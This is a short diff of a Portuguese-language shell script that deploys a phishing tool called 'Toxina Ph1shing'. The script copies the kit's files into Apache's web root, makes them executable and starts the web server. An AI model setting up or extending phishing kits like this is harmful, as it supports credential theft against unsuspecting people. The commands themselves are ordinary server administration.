@@ -69,7 +69,7 @@ $c
 echo "[**Movendo o Toxina Ph1shing para o Apache2**]"
 sudo mkdir -p /var/www/html/page
 sudo cp -r * /var/www/html/page
-touch arquivo.exe
+sudo chmod +x /var/www/html/page/* 
 sudo systemctl start apache2
 sudo systemctl enable apache2
 echo "[**Toxina Ph1shing movido com sucesso!**]"
